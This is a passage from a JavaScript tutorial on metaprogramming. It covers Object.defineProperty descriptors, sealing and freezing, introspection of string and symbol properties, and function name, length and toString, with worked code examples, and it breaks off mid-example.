- **Proxy**: Constructor, all 13 handler traps (`get`, `set`, `has`, `deleteProperty`, `ownKeys`, `getOwnPropertyDescriptor`, `defineProperty`, `preventExtensions`, `isExtensible`, `getPrototypeOf`, `setPrototypeOf`, `apply`, `construct`), revocable proxies, and practical use cases
- **Reflect**: All methods mirroring proxy traps, advantages over Object methods, and proper usage as receiver in proxy handlers

Proxies and Reflect provide powerful metaprogramming capabilities for creating flexible, dynamic objects with custom behavior.

---

**Related Topics to Explore Next:**

- WeakMap and WeakSet for memory-efficient proxies
- Symbol for custom object behaviors
- Decorators (stage 3 proposal)
- Advanced metaprogramming patterns
- Performance considerations with proxies
---

**End of Chapter 15**


# 16-Meta-Programming.md

# 16 Meta Programming

---

# Meta-programming


## 16.1 Property Descriptors

Property descriptors define the characteristics of object properties. They control whether properties can be changed, deleted, or enumerated.

### Configuring Object Properties

Every property has a descriptor with specific attributes that control its behavior.

**Getting Property Descriptors:**

```javascript
const obj = {
  name: 'Alice',
  age: 30
};

// Get descriptor for a property
const descriptor = Object.getOwnPropertyDescriptor(obj, 'name');
console.log(descriptor);
// {
//   value: 'Alice',
//   writable: true,
//   enumerable: true,
//   configurable: true
// }

// Properties created normally have all attributes set to true
const ageDescriptor = Object.getOwnPropertyDescriptor(obj, 'age');
console.log(ageDescriptor);
// {
//   value: 30,
//   writable: true,
//   enumerable: true,
//   configurable: true
// }

// Non-existent properties return undefined
console.log(Object.getOwnPropertyDescriptor(obj, 'nonExistent')); // undefined
```

**Defining Properties with Descriptors:**

```javascript
const obj = {};

// Define property with specific attributes
Object.defineProperty(obj, 'name', {
  value: 'Alice',
  writable: true,
  enumerable: true,
  configurable: true
});

// Define read-only property
Object.defineProperty(obj, 'id', {
  value: 123,
  writable: false,     // Cannot be changed
  enumerable: true,
  configurable: false  // Cannot be deleted or reconfigured
});

console.log(obj.id); // 123
obj.id = 456; // Fails silently in non-strict mode
console.log(obj.id); // Still 123

try {
  'use strict';
  obj.id = 456; // TypeError in strict mode
} catch (e) {
  console.log('Cannot modify read-only property');
}
```

**Data Descriptors vs Accessor Descriptors:**

```javascript
const obj = {};

// Data descriptor (value-based)
Object.defineProperty(obj, 'dataProperty', {
  value: 42,
  writable: true,
  enumerable: true,
  configurable: true
});

// Accessor descriptor (getter/setter-based)
let internalValue = 0;
Object.defineProperty(obj, 'accessorProperty', {
  get() {
    console.log('Getting value');
    return internalValue;
  },
  set(value) {
    console.log('Setting value:', value);
    internalValue = value;
  },
  enumerable: true,
  configurable: true
});

console.log(obj.dataProperty); // 42
obj.accessorProperty = 100; // "Setting value: 100"
console.log(obj.accessorProperty); // "Getting value" then 100

// Cannot mix data and accessor attributes
try {
  Object.defineProperty(obj, 'invalid', {
    value: 42,
    get() { return 0; } // Error: cannot have both
  });
} catch (e) {
  console.log('Cannot mix value and getter');
}
```

**Defining Multiple Properties:**

```javascript
const obj = {};

Object.defineProperties(obj, {
  firstName: {
    value: 'Alice',
    writable: true,
    enumerable: true,
    configurable: true
  },
  lastName: {
    value: 'Smith',
    writable: true,
    enumerable: true,
    configurable: true
  },
  fullName: {
    get() {
      return `${this.firstName} ${this.lastName}`;
    },
    set(value) {
      const parts = value.split(' ');
      this.firstName = parts[0];
      this.lastName = parts[1];
    },
    enumerable: true,
    configurable: true
  },
  age: {
    value: 30,
    writable: true,
    enumerable: false, // Won't show in for...in
    configurable: true
  }
});

console.log(obj.fullName); // "Alice Smith"
obj.fullName = 'Bob Jones';
console.log(obj.firstName); // "Bob"
console.log(obj.lastName); // "Jones"

// Age is not enumerable
for (let key in obj) {
  console.log(key); // firstName, lastName, fullName (no age)
}
```

### Property Attributes Manipulation

Understanding and manipulating the four property attributes: `value`, `writable`, `enumerable`, and `configurable`.

**`writable` Attribute:**

```javascript
const obj = {};

// Create writable property
Object.defineProperty(obj, 'name', {
  value: 'Alice',
  writable: true,
  enumerable: true,
  configurable: true
});

obj.name = 'Bob'; // Works
console.log(obj.name); // "Bob"

// Create non-writable property
Object.defineProperty(obj, 'id', {
  value: 123,
  writable: false,
  enumerable: true,
  configurable: true
});

obj.id = 456; // Silently fails in non-strict mode
console.log(obj.id); // 123 (unchanged)

// In strict mode, throws TypeError
'use strict';
try {
  const strictObj = {};
  Object.defineProperty(strictObj, 'readonly', {
    value: 'fixed',
    writable: false
  });
  strictObj.readonly = 'changed'; // TypeError
} catch (e) {
  console.log('Cannot assign to read-only property');
}
```

**`enumerable` Attribute:**

```javascript
const obj = {
  public: 'visible',
  _private: 'hidden'
};

// Make _private non-enumerable
Object.defineProperty(obj, '_private', {
  enumerable: false
});

// for...in loop
console.log('for...in:');
for (let key in obj) {
  console.log(key); // Only 'public'
}

// Object.keys
console.log('Object.keys:', Object.keys(obj)); // ['public']

// JSON.stringify
console.log('JSON:', JSON.stringify(obj)); // {"public":"visible"}

// But still accessible
console.log(obj._private); // "hidden"

// Object.getOwnPropertyNames includes non-enumerable
console.log('All properties:', Object.getOwnPropertyNames(obj));
// ['public', '_private']
```

**`configurable` Attribute:**

```javascript
const obj = {};

// Create configurable property
Object.defineProperty(obj, 'name', {
  value: 'Alice',
  writable: true,
  enumerable: true,
  configurable: true
});

// Can change descriptor
Object.defineProperty(obj, 'name', {
  writable: false
});

// Can delete
delete obj.name;
console.log(obj.name); // undefined

// Create non-configurable property
Object.defineProperty(obj, 'id', {
  value: 123,
  writable: true,
  enumerable: true,
  configurable: false
});

// Cannot delete
delete obj.id;
console.log(obj.id); // 123 (still there)

// Cannot reconfigure
try {
  Object.defineProperty(obj, 'id', {
    enumerable: false // TypeError: cannot redefine property
  });
} catch (e) {
  console.log('Cannot reconfigure non-configurable property');
}

// Exception: Can change writable from true to false
Object.defineProperty(obj, 'id', {
  writable: false // This is allowed
});

// But cannot change back from false to true
try {
  Object.defineProperty(obj, 'id', {
    writable: true // TypeError
  });
} catch (e) {
  console.log('Cannot make non-configurable property writable again');
}
```

**Creating Immutable Properties:**

```javascript
function createConstant(obj, name, value) {
  Object.defineProperty(obj, name, {
    value: value,
    writable: false,
    enumerable: true,
    configurable: false
  });
}

const config = {};
createConstant(config, 'API_KEY', 'secret123');
createConstant(config, 'MAX_RETRIES', 3);

console.log(config.API_KEY); // 'secret123'
config.API_KEY = 'changed'; // Fails silently
console.log(config.API_KEY); // Still 'secret123'
delete config.API_KEY; // Fails silently
console.log(config.API_KEY); // Still 'secret123'
```

**Creating Hidden Properties:**

```javascript
function addHiddenProperty(obj, name, value) {
  Object.defineProperty(obj, name, {
    value: value,
    writable: true,
    enumerable: false,
    configurable: true
  });
}

const user = { name: 'Alice' };
addHiddenProperty(user, '_id', 123);
addHiddenProperty(user, '_metadata', { created: new Date() });

console.log(user._id); // 123 (accessible)
console.log(Object.keys(user)); // ['name'] (hidden from enumeration)
console.log(JSON.stringify(user)); // {"name":"Alice"} (not in JSON)
```

**Computed Properties with Caching:**

```javascript
function createCachedProperty(obj, name, computeFn) {
  let cache;
  let computed = false;
  
  Object.defineProperty(obj, name, {
    get() {
      if (!computed) {
        console.log(`Computing ${name}...`);
        cache = computeFn.call(this);
        computed = true;
      }
      return cache;
    },
    enumerable: true,
    configurable: true
  });
}

const circle = { radius: 5 };

createCachedProperty(circle, 'area', function() {
  return Math.PI * this.radius ** 2;
});

createCachedProperty(circle, 'circumference', function() {
  return 2 * Math.PI * this.radius;
});

console.log(circle.area); // Computes and caches
console.log(circle.area); // Returns cached value
console.log(circle.circumference); // Computes and caches
```

**Validation with Setters:**

```javascript
const user = {};

Object.defineProperty(user, 'age', {
  get() {
    return this._age;
  },
  set(value) {
    if (typeof value !== 'number') {
      throw new TypeError('Age must be a number');
    }
    if (value < 0 || value > 150) {
      throw new RangeError('Age must be between 0 and 150');
    }
    this._age = value;
  },
  enumerable: true,
  configurable: true
});

Object.defineProperty(user, 'email', {
  get() {
    return this._email;
  },
  set(value) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(value)) {
      throw new Error('Invalid email format');
    }
    this._email = value;
  },
  enumerable: true,
  configurable: true
});

user.age = 30; // Works
user.email = 'alice@example.com'; // Works

try {
  user.age = 'thirty'; // TypeError
} catch (e) {
  console.log(e.message);
}

try {
  user.email = 'invalid-email'; // Error
} catch (e) {
  console.log(e.message);
}
```

**Sealed and Frozen Objects:**

```javascript
// Object.seal - prevents adding/removing properties
const sealed = { name: 'Alice', age: 30 };
Object.seal(sealed);

sealed.name = 'Bob'; // Works (can modify)
sealed.newProp = 'value'; // Fails (cannot add)
delete sealed.age; // Fails (cannot delete)

console.log(Object.isSealed(sealed)); // true

// Under the hood, seal makes all properties non-configurable
const descriptor = Object.getOwnPropertyDescriptor(sealed, 'name');
console.log(descriptor.configurable); // false

// Object.freeze - makes object completely immutable
const frozen = { name: 'Charlie', age: 25 };
Object.freeze(frozen);

frozen.name = 'David'; // Fails (cannot modify)
frozen.newProp = 'value'; // Fails (cannot add)
delete frozen.age; // Fails (cannot delete)

console.log(Object.isFrozen(frozen)); // true

// Under the hood, freeze makes properties non-writable and non-configurable
const frozenDesc = Object.getOwnPropertyDescriptor(frozen, 'name');
console.log(frozenDesc.writable); // false
console.log(frozenDesc.configurable); // false
```

**Deep Freeze Implementation:**

```javascript
function deepFreeze(obj) {
  // Freeze the object itself
  Object.freeze(obj);
  
  // Recursively freeze all object properties
  Object.getOwnPropertyNames(obj).forEach(prop => {
    const value = obj[prop];
    if (value && typeof value === 'object' && !Object.isFrozen(value)) {
      deepFreeze(value);
    }
  });
  
  return obj;
}

const data = {
  name: 'Alice',
  address: {
    city: 'New York',
    zip: '10001'
  },
  hobbies: ['reading', 'gaming']
};

deepFreeze(data);

data.name = 'Bob'; // Fails
data.address.city = 'Boston'; // Fails (nested object also frozen)
data.hobbies.push('cooking'); // Fails (array also frozen)

console.log(data);
// Original data unchanged
```

**Property Descriptor Utilities:**

```javascript
// Get all descriptors
function getAllDescriptors(obj) {
  const descriptors = {};
  for (const key of Object.getOwnPropertyNames(obj)) {
    descriptors[key] = Object.getOwnPropertyDescriptor(obj, key);
  }
  return descriptors;
}

const obj = {
  name: 'Alice',
  get age() { return 30; }
};

Object.defineProperty(obj, '_id', {
  value: 123,
  enumerable: false
});

console.log(getAllDescriptors(obj));
// {
//   name: { value: 'Alice', writable: true, ... },
//   age: { get: [Function], set: undefined, ... },
//   _id: { value: 123, writable: false, enumerable: false, ... }
// }

// Copy descriptors to another object
function copyWithDescriptors(source, target) {
  const descriptors = getAllDescriptors(source);
  Object.defineProperties(target, descriptors);
  return target;
}

const copy = copyWithDescriptors(obj, {});
console.log(copy.name); // 'Alice'
console.log(copy.age); // 30
console.log(Object.keys(copy)); // ['name'] (_id is hidden)
```

---

## 16.2 Object Introspection

Object introspection allows you to examine and analyze objects at runtime, discovering their properties, structure, and characteristics.

### `Object.getOwnPropertyNames()`

Returns an array of all property names (including non-enumerable ones) found directly on an object.

**Basic Usage:**

```javascript
const obj = {
  name: 'Alice',
  age: 30
};

// Add non-enumerable property
Object.defineProperty(obj, '_id', {
  value: 123,
  enumerable: false
});

// getOwnPropertyNames includes non-enumerable properties
console.log(Object.getOwnPropertyNames(obj));
// ['name', 'age', '_id']

// Compare with Object.keys (only enumerable)
console.log(Object.keys(obj));
// ['name', 'age']

// Compare with for...in (enumerable + inherited)
for (let key in obj) {
  console.log(key); // name, age
}
```

**Excluding Inherited Properties:**

```javascript
function Animal(name) {
  this.name = name;
}

Animal.prototype.speak = function() {
  console.log(`${this.name} makes a sound`);
};

const dog = new Animal('Buddy');
dog.breed = 'Golden Retriever';

// Own properties only
console.log(Object.getOwnPropertyNames(dog));
// ['name', 'breed']

// Does not include prototype properties
// 'speak' is on the prototype, not own property

// To get all properties including inherited:
function getAllProperties(obj) {
  const props = new Set();
  
  let current = obj;
  while (current) {
    Object.getOwnPropertyNames(current).forEach(prop => props.add(prop));
    current = Object.getPrototypeOf(current);
  }
  
  return Array.from(props);
}

console.log(getAllProperties(dog));
// ['name', 'breed', 'speak', 'constructor', 'toString', ...]
```

**Finding Hidden Properties:**

```javascript
const obj = {
  public1: 'visible',
  public2: 'visible'
};

// Add hidden properties
Object.defineProperty(obj, 'secret1', {
  value: 'hidden',
  enumerable: false
});

Object.defineProperty(obj, 'secret2', {
  value: 'also hidden',
  enumerable: false
});

// Object.keys doesn't find them
console.log('Object.keys:', Object.keys(obj));
// ['public1', 'public2']

// But getOwnPropertyNames does
console.log('getOwnPropertyNames:', Object.getOwnPropertyNames(obj));
// ['public1', 'public2', 'secret1', 'secret2']

// Filter for hidden properties
function getHiddenProperties(obj) {
  return Object.getOwnPropertyNames(obj).filter(prop => {
    const descriptor = Object.getOwnPropertyDescriptor(obj, prop);
    return !descriptor.enumerable;
  });
}

console.log('Hidden:', getHiddenProperties(obj));
// ['secret1', 'secret2']
```

**Analyzing Object Structure:**

```javascript
function analyzeObject(obj) {
  const properties = Object.getOwnPropertyNames(obj);
  
  const analysis = {
    total: properties.length,
    enumerable: 0,
    nonEnumerable: 0,
    writable: 0,
    nonWritable: 0,
    configurable: 0,
    nonConfigurable: 0,
    accessors: 0,
    dataProperties: 0
  };
  
  properties.forEach(prop => {
    const desc = Object.getOwnPropertyDescriptor(obj, prop);
    
    if (desc.enumerable) analysis.enumerable++;
    else analysis.nonEnumerable++;
    
    if (desc.hasOwnProperty('value')) {
      analysis.dataProperties++;
      if (desc.writable) analysis.writable++;
      else analysis.nonWritable++;
    } else {
      analysis.accessors++;
    }
    
    if (desc.configurable) analysis.configurable++;
    else analysis.nonConfigurable++;
  });
  
  return analysis;
}

const obj = {};
Object.defineProperties(obj, {
  name: { value: 'Alice', writable: true, enumerable: true },
  id: { value: 123, writable: false, enumerable: false },
  age: {
    get() { return 30; },
    enumerable: true
  }
});

console.log(analyzeObject(obj));
// {
//   total: 3,
//   enumerable: 2,
//   nonEnumerable: 1,
//   writable: 1,
//   nonWritable: 1,
//   configurable: 3,
//   nonConfigurable: 0,
//   accessors: 1,
//   dataProperties: 2
// }
```

### `Object.getOwnPropertySymbols()`

Returns an array of all symbol properties found directly on an object.

**Basic Symbol Properties:**

```javascript
const obj = {
  name: 'Alice',
  age: 30
};

// Add symbol properties
const idSymbol = Symbol('id');
const metaSymbol = Symbol('metadata');

obj[idSymbol] = 123;
obj[metaSymbol] = { created: new Date() };

// Regular property methods don't see symbols
console.log(Object.keys(obj)); // ['name', 'age']
console.log(Object.getOwnPropertyNames(obj)); // ['name', 'age']

// getOwnPropertySymbols finds only symbols
console.log(Object.getOwnPropertySymbols(obj));
// [Symbol(id), Symbol(metadata)]

// Access symbol properties
console.log(obj[idSymbol]); // 123
console.log(obj[metaSymbol]); // { created: ... }
```

**Getting All Properties (Strings + Symbols):**

```javascript
function getAllOwnProperties(obj) {
  return [
    ...Object.getOwnPropertyNames(obj),
    ...Object.getOwnPropertySymbols(obj)
  ];
}

const obj = {
  name: 'Alice',
  age: 30
};

const id = Symbol('id');
const metadata = Symbol.for('metadata');

obj[id] = 123;
obj[metadata] = { type: 'user' };

console.log(getAllOwnProperties(obj));
// ['name', 'age', Symbol(id), Symbol(metadata)]
```

**Well-Known Symbols:**

```javascript
class MyArray {
  constructor(...items) {
    this.items = items;
  }
  
  // Custom iterator
  *[Symbol.iterator]() {
    for (const item of this.items) {
      yield item;
    }
  }
  
  // Custom species
  static get [Symbol.species]() {
    return Array;
  }
  
  // Custom string representation
  get [Symbol.toStringTag]() {
    return 'MyArray';
  }
}

const arr = new MyArray(1, 2, 3);

// Check for well-known symbols
const symbols = Object.getOwnPropertySymbols(MyArray.prototype);
console.log(symbols);
// [Symbol(Symbol.iterator), Symbol(Symbol.toStringTag)]

// Use the iterator
for (const item of arr) {
  console.log(item); // 1, 2, 3
}

// Use toStringTag
console.log(Object.prototype.toString.call(arr)); // [object MyArray]
```

**Symbol Property Descriptors:**

```javascript
const obj = {};
const sym = Symbol('hidden');

Object.defineProperty(obj, sym, {
  value: 'secret',
  enumerable: false,
  writable: false,
  configurable: false
});

// Symbol properties have descriptors too
const descriptor = Object.getOwnPropertyDescriptor(obj, sym);
console.log(descriptor);
// { value: 'secret', writable: false, enumerable: false, configurable: false }

// But symbols are always hidden from JSON
console.log(JSON.stringify(obj)); // {}

// And from for...in
for (let key in obj) {
  console.log(key); // Nothing
}
```

**Private-like Properties with Symbols:**

```javascript
const _privateData = Symbol('privateData');

class User {
  constructor(name, password) {
    this.name = name;
    this[_privateData] = { password, loginAttempts: 0 };
  }
  
  login(password) {
    const data = this[_privateData];
    
    if (data.password === password) {
      data.loginAttempts = 0;
      return { success: true };
    }
    
    data.loginAttempts++;
    return {
      success: false,
      attemptsRemaining: 3 - data.loginAttempts
    };
  }
  
  getPublicData() {
    return { name: this.name };
  }
}

const user = new User('Alice', 'secret123');

// Name is public
console.log(user.name); // 'Alice'

// Password is hidden (but discoverable)
console.log(Object.getOwnPropertySymbols(user)); // [Symbol(privateData)]
console.log(user[_privateData]); // { password: 'secret123', ... }

// JSON doesn't include symbols
console.log(JSON.stringify(user)); // {"name":"Alice"}
```

### Enumerability and Iteration

Understanding how enumerability affects iteration and various object methods.

**Enumerable vs Non-Enumerable:**

```javascript
const obj = {};

// Enumerable property
Object.defineProperty(obj, 'name', {
  value: 'Alice',
  enumerable: true,
  writable: true,
  configurable: true
});

// Non-enumerable property
Object.defineProperty(obj, '_id', {
  value: 123,
  enumerable: false,
  writable: true,
  configurable: true
});

// for...in - only enumerable
for (let key in obj) {
  console.log(key); // 'name'
}

// Object.keys - only enumerable
console.log(Object.keys(obj)); // ['name']

// Object.values - only enumerable values
console.log(Object.values(obj)); // ['Alice']

// Object.entries - only enumerable key-value pairs
console.log(Object.entries(obj)); // [['name', 'Alice']]

// JSON.stringify - only enumerable
console.log(JSON.stringify(obj)); // {"name":"Alice"}

// But property is still accessible
console.log(obj._id); // 123

// Object.getOwnPropertyNames - all properties
console.log(Object.getOwnPropertyNames(obj)); // ['name', '_id']
```

**Iteration Methods Comparison:**

```javascript
function Parent(x) {
  this.x = x;
}
Parent.prototype.parentProp = 'inherited';

const obj = new Parent(10);
obj.y = 20;

Object.defineProperty(obj, 'z', {
  value: 30,
  enumerable: false
});

console.log('\n=== for...in (enumerable own + inherited) ===');
for (let key in obj) {
  console.log(key, obj[key]);
}
// x 10
// y 20
// parentProp inherited

console.log('\n=== Object.keys (enumerable own only) ===');
console.log(Object.keys(obj)); // ['x', 'y']

console.log('\n=== Object.getOwnPropertyNames (all own) ===');
console.log(Object.getOwnPropertyNames(obj)); // ['x', 'y', 'z']

console.log('\n=== hasOwnProperty filter ===');
for (let key in obj) {
  if (obj.hasOwnProperty(key)) {
    console.log(key, obj[key]);
  }
}
// x 10
// y 20
```

**Making Properties Enumerable/Non-Enumerable:**

```javascript
const obj = { name: 'Alice', age: 30, _password: 'secret' };

// Make _password non-enumerable
Object.defineProperty(obj, '_password', {
  enumerable: false
});

console.log('Before:', Object.keys(obj)); // ['name', 'age']

// Make it enumerable again
Object.defineProperty(obj, '_password', {
  enumerable: true
});

console.log('After:', Object.keys(obj)); // ['name', 'age', '_password']

// Bulk change enumerability
function hidePrivateProps(obj) {
  Object.getOwnPropertyNames(obj).forEach(prop => {
    if (prop.startsWith('_')) {
      Object.defineProperty(obj, prop, {
        enumerable: false
      });
    }
  });
}

const user = {
  name: 'Bob',
  _id: 123,
  _metadata: { created: new Date() }
};

hidePrivateProps(user);
console.log(Object.keys(user)); // ['name']
```

**Custom Iteration:**

```javascript
class Range {
  constructor(start, end) {
    this.start = start;
    this.end = end;
  }
  
  // Make iterable
  *[Symbol.iterator]() {
    for (let i = this.start; i <= this.end; i++) {
      yield i;
    }
  }
}

const range = new Range(1, 5);

// Can use in for...of
for (const num of range) {
  console.log(num); // 1, 2, 3, 4, 5
}

// Can spread
console.log([...range]); // [1, 2, 3, 4, 5]

// Can use Array.from
console.log(Array.from(range)); // [1, 2, 3, 4, 5]
```

**Property Enumeration Utilities:**

```javascript
// Get only enumerable properties
function getEnumerableProps(obj) {
  return Object.keys(obj);
}

// Get only non-enumerable properties
function getNonEnumerableProps(obj) {
  return Object.getOwnPropertyNames(obj).filter(prop => {
    const descriptor = Object.getOwnPropertyDescriptor(obj, prop);
    return !descriptor.enumerable;
  });
}

// Get all properties with their enumerability
function getAllPropsWithEnum(obj) {
  const allProps = [
    ...Object.getOwnPropertyNames(obj),
    ...Object.getOwnPropertySymbols(obj)
  ];
  
  return allProps.map(prop => {
    const descriptor = Object.getOwnPropertyDescriptor(obj, prop);
    return {
      property: prop,
      enumerable: descriptor.enumerable,
      type: typeof prop === 'symbol' ? 'symbol' : 'string'
    };
  });
}

const obj = {
  public: 'visible'
};

Object.defineProperty(obj, 'hidden', {
  value: 'not visible',
  enumerable: false
});

const sym = Symbol('symbol');
obj[sym] = 'symbol value';

console.log(getAllPropsWithEnum(obj));
// [
//   { property: 'public', enumerable: true, type: 'string' },
//   { property: 'hidden', enumerable: false, type: 'string' },
//   { property: Symbol(symbol), enumerable: true, type: 'symbol' }
// ]
```

---

## 16.3 Function Introspection

Function introspection allows you to examine functions at runtime, accessing metadata and source code.

### Function `name` Property

The `name` property returns the name of the function.

**Named Functions:**

```javascript
function myFunction() {}
console.log(myFunction.name); // 'myFunction'

const anotherFunction = function() {};
console.log(anotherFunction.name); // 'anotherFunction'

const namedExpression = function explicitName() {};
console.log(namedExpression.name); // 'explicitName'

// Arrow functions
const arrowFunc = () => {};
console.log(arrowFunc.name); // 'arrowFunc'
```

**Methods and Classes:**

```javascript
class MyClass {
  method() {}
  
  static staticMethod() {}
  
  get accessor() { return 1; }
  set accessor(value) {}
}

console.log(MyClass.name); // 'MyClass'
console.log(MyClass.prototype.method.name); // 'method'
console.log(MyClass.staticMethod.name); // 'staticMethod'

const descriptor = Object.getOwnPropertyDescriptor(
  MyClass.prototype,
  'accessor'
);
console.log(descriptor.get.name); // 'get accessor'
console.log(descriptor.set.name); // 'set accessor'
```

**Bound Functions:**

```javascript
function greet(greeting) {
  return `${greeting}, ${this.name}`;
}

const person = { name: 'Alice' };
const boundGreet = greet.bind(person);

console.log(greet.name); // 'greet'
console.log(boundGreet.name); // 'bound greet'

const doubleBound = boundGreet.bind(person);
console.log(doubleBound.name); // 'bound bound greet'
```

**Special Cases:**

```javascript
// Anonymous functions assigned to properties
const obj = {
  method: function() {}
};
console.log(obj.method.name); // 'method'

// Computed property names
const propName = 'dynamicMethod';
const obj2 = {
  [propName]() {}
};
console.log(obj2[propName].name); // 'dynamicMethod'

// Symbols as property names
const sym = Symbol('mySymbol');
const obj3 = {
  [sym]() {}
};
console.log(obj3[sym].name); // '[mySymbol]'

// Constructor property
console.log(Object.name); // 'Object'
console.log(Array.name); // 'Array'
console.log(Function.name); // 'Function'
```

**Function.name Use Cases:**

```javascript
// Debugging helper
function createLogger(fn) {
  return function(...args) {
    console.log(`Calling ${fn.name} with:`, args);
    const result = fn(...args);
    console.log(`${fn.name} returned:`, result);
    return result;
  };
}

function add(a, b) {
  return a + b;
}

const loggedAdd = createLogger(add);
loggedAdd(5, 3);
// Calling add with: [5, 3]
// add returned: 8

// Function registry
class FunctionRegistry {
  constructor() {
    this.functions = new Map();
  }
  
  register(fn) {
    const name = fn.name || 'anonymous';
    this.functions.set(name, fn);
  }
  
  call(name, ...args) {
    const fn = this.functions.get(name);
    if (!fn) {
      throw new Error(`Function ${name} not registered`);
    }
    return fn(...args);
  }
  
  list() {
    return Array.from(this.functions.keys());
  }
}

const registry = new FunctionRegistry();

function multiply(a, b) { return a * b; }
function divide(a, b) { return a / b; }

registry.register(multiply);
registry.register(divide);

console.log(registry.list()); // ['multiply', 'divide']
console.log(registry.call('multiply', 6, 7)); // 42
```

### Function `length` Property

The `length` property indicates the number of parameters expected by the function.

**Basic Length:**

```javascript
function noParams() {}
function oneParam(a) {}
function twoParams(a, b) {}
function threeParams(a, b, c) {}

console.log(noParams.length); // 0
console.log(oneParam.length); // 1
console.log(twoParams.length); // 2
console.log(threeParams.length); // 3
```

**Default Parameters:**

```javascript
// Parameters with defaults are not counted
function withDefaults(a, b = 10, c = 20) {}
console.log(withDefaults.length); // 1 (only 'a')

function mixedDefaults(a, b, c = 30) {}
console.log(mixedDefaults.length); // 2 (a and b)

function allDefaults(a = 1, b = 2) {}
console.log(allDefaults.length); // 0
```

**Rest Parameters:**

```javascript
// Rest parameters are not counted
function withRest(a, b, ...rest) {}
console.log(withRest.length); // 2 (only a and b)

function onlyRest(...args) {}
console.log(onlyRest.length); // 0

function beforeDefault(a, b = 10, ...rest) {}
console.log(beforeDefault.length); // 1 (only a)
```

**Arrow Functions:**

```javascript
const arrow1 = () => {};
const arrow2 = (a) => {};
const arrow3 = (a, b, c) => {};
const arrowDefault = (a, b = 10) => {};
const arrowRest = (a, ...rest) => {};

console.log(arrow1.length); // 0
console.log(arrow2.length); // 1
console.log(arrow3.length); // 3
console.log(arrowDefault.length); // 1
console.log(arrowRest.length); // 1
```

**Using Length for Validation:**

```javascript
function validateArity(fn, expectedLength) {
  return function(...args) {
    if (args.length !== expectedLength) {
      throw new Error(
        `Expected ${expectedLength} arguments, got ${args.length}`
      );
    }
    return fn(...args);
  };
}

function add(a, b) {
  return a + b;
}

const strictAdd = validateArity(add, 2);

console.log(strictAdd(5, 3)); // 8

try {
  strictAdd(5); // Error: Expected 2 arguments, got 1
} catch (e) {
  console.log(e.message);
}
```

**Currying Based on Length:**

```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...nextArgs) {
      return curried.apply(this, args.concat(nextArgs));
    };
  };
}

function sum(a, b, c) {
  return a + b + c;
}

const curriedSum = curry(sum);

console.log(curriedSum(1)(2)(3)); // 6
console.log(curriedSum(1, 2)(3)); // 6
console.log(curriedSum(1, 2, 3)); // 6
```

**Function Signature Analyzer:**

```javascript
function analyzeFunctionSignature(fn) {
  const params = fn.toString()
    .match(/\(([^)]*)\)/)[1]
    .split(',')
    .map(p => p.trim())
    .filter(p => p);
  
  return {
    name: fn.name || 'anonymous',
    paramCount: fn.length,
    totalParams: params.length,
    hasDefaults: params.length > fn.length,
    hasRest: params.some(p => p.startsWith('...')),
    parameters: params
  };
}

function example(a, b = 10, ...rest) {
  return a + b;
}

console.log(analyzeFunctionSignature(example));
// {
//   name: 'example',
//   paramCount: 1,
//   totalParams: 3,
//   hasDefaults: true,
//   hasRest: true,
//   parameters: ['a', 'b = 10', '...rest']
// }
```

### `toString()` Method

The `toString()` method returns a string representing the function's source code.

**Basic toString:**

```javascript
function greet(name) {
  return `Hello, ${name}!`;
}

console.log(greet.toString());
// "function greet(name) {
//   return `Hello, ${name}!`;
// }"

const add = (a, b) => a + b;
console.log(add.toString());
// "(a, b) => a + b"
```

**Built-in Functions:**

```javascript
// Built-in functions show native code
console.log(Math.max.toString());
// "function max() { [native code] }"

console.log(Array.prototype.map.toString());
// "function map() { [native code] }"

// Bound functions
function original() {}
const bound = original.bind(null);
console.log(bound.toString());
// "function () { [native code] }"
```

**Class Methods:**

```javascript
class MyClass {
  constructor(value) {
    this.value = value;
  }
  
  method() {
    return this.value * 2;
  }
  
  static staticMethod() {
    return 'static';
  }
}

console.log(MyClass.toString());
// "class MyClass {
//   constructor(value) { ... }
//   method() { ... }
//   static staticMethod() { ... }
// }"

console.log(MyClass.prototype.method.toString());
// "method() {
//   return this.value * 2;
// }"
```

### Accessing Function Source

Extracting and analyzing function source code.

**Extracting Function Body:**

```javascript
function extractFunctionBody(fn) {
  const source = fn.toString();
  
  // For arrow functions
  if (source.includes('=>')) {
    const arrowIndex = source.indexOf('=>');
    let body = source.slice(arrowIndex + 2).trim();
    
    // Remove braces if present
    if (body.startsWith('{') && body.endsWith('}')) {
      body = body.slice(1, -1).trim();
    }
    
    return body;
  }
  
  // For regular functions
  const match = source.match(/\{([\s\S]*)\}/);
  return match ? match[1].trim() : '';
}

function example() {
  const x = 10;
  return x * 2;
}

const arrow = () => {
  return 42;
};

const singleLine = () => 42;

console.log(extractFunctionBody(example));
// "const x = 10;
//  return x * 2;"

console.log(extractFunctionBody(arrow));
// "return 42;"

console.log(extractFunctionBody(singleLine));
// "42"
```

**Extracting Parameters:**

```javascript
function extractParameters(fn) {
  const source = fn.toString();
  
  // Match parameters in parentheses
  const match = source.match(/\(([^)]*)\)/);
  if (!match) return [];
  
  return match[1]
    .split(',')
    .map(param => param.trim())
    .filter(param => param);
}

function test(a, b, c = 10, ...rest) {}

console.log(extractParameters(test));
// ['a', 'b', 'c = 10', '...rest']

const arrow = (x, y) => x + y;
console.log(extractParameters(arrow));
// ['x', 'y']
```

**Function Metadata Extractor:**

```javascript
function extractMetadata(fn) {
  const source = fn.toString();
  const params = extractParameters(fn);
  
  // Check for async
  const isAsync = source.trim().startsWith('async');
  
  // Check for generator
  const isGenerator = source.includes('function*') || source.includes('*' + fn.name);
  
  // Check for arrow function
  const isArrow = source.includes('=>');
  
  // Extract comments (simple regex)
  const comments = [];
  const commentRegex = /\/\*[\s\S]*?\*\/|\/\/.*/g;
  let match;
  while ((match = commentRegex.exec(source)) !== null) {
    comments.push(match[0]);
  }
  
  return {
    name: fn.name || 'anonymous',
    type: isArrow ? 'arrow' : isGenerator ? 'generator' : isAsync ? 'async' : 'function',
    parameters: params,
    parameterCount: fn.length,
    isAsync,
    isGenerator,
    isArrow,
    source: source,
    body: extractFunctionBody(fn),
    comments
  };
}

async function* exampleGenerator(a, b = 10) {
  // This is a comment
  yield a;
  yield b;
}

console.log(extractMetadata(exampleGenerator));
// {
//   name: 'exampleGenerator',
//   type: 'generator',
//   parameters: ['a', 'b = 10'],
//   parameterCount: 1,
//   isAsync: true,
//   isGenerator: true,
//   isArrow: false,
